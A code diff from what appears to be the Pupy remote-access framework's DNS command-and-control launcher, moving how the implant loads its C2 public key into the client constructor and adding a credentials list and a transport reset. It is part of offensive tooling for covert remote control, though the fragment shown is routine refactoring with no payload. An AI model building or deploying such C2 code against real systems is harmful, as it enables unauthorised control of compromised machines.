@@ -11,19 +11,21 @@ import os
 
 import logging
 
-try:
-    from pupy_credentials import DNSCNC_PUB_KEY
-    key = DNSCNC_PUB_KEY
-except:
-    from network.transports import DEFAULT_DNSCNC_PUB_KEY
-    key = DEFAULT_DNSCNC_PUB_KEY
-
 class DNSCommandClientLauncher(DnsCommandsClient):
     def __init__(self, domain):
         self.stream = None
         self.commands = []
         self.lock = Lock()
         self.new_commands = Event()
+
+        try:
+            from pupy_credentials import DNSCNC_PUB_KEY
+            key = DNSCNC_PUB_KEY
+        except:
+            from pupylib.PupyCredentials import Credentials
+            credentials = Credentials()
+            key = credentials['DNSCNC_PUB_KEY']
+
         DnsCommandsClient.__init__(self, domain, key=key)
 
     def on_pastelink_content(self, url, action, content):
@@ -59,6 +61,9 @@ class DNSCommandClientLauncher(DnsCommandsClient):
 
 class DNSCncLauncher(BaseLauncher):
     ''' Micro command protocol built over DNS infrastructure '''
+
+    credentials = [ 'DNSCNC_PUB_KEY' ]
+
     def __init__(self, *args, **kwargs):
         self.connect_on_bind_payload=kwargs.pop('connect_on_bind_payload', False)
         super(DNSCncLauncher, self).__init__(*args, **kwargs)
@@ -79,6 +84,7 @@ class DNSCncLauncher(BaseLauncher):
     def parse_args(self, args):
         self.args = self.arg_parser.parse_args(args)
         self.set_host(self.args.domain)
+        self.set_transport(None)
 
     def iterate(self):
         if self.args is None:
